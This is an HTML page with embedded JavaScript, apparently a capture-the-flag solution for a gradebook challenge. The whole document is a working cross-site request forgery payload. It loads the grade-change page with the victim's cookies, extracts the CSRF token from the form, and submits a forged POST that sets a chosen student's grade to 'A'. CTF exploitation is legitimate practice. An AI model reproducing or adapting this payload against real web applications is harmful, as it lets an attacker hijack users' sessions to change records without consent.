<!DOCTYPE html>
<html>
<body>
    <script>
        // Step 1: Get CSRF token from grade-change page
        fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
            credentials: 'include'
        })
        .then(response => response.text())
        .then(html => {
            // Extract CSRF token from HTML
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const csrfToken = doc.querySelector('input[name="csrf_token"]').value;

            // Step 2: Submit grade change POST request
            const formData = new FormData();
            formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
            formData.append('class_id', 'e522382b-7643-469c-ae52-ba488f5752c6');
            formData.append('grade', 'A');
            formData.append('csrf_token', csrfToken);

            fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
                method: 'POST',
                body: formData,
                credentials: 'include'
            });
        });
    </script>
</body>
</html>
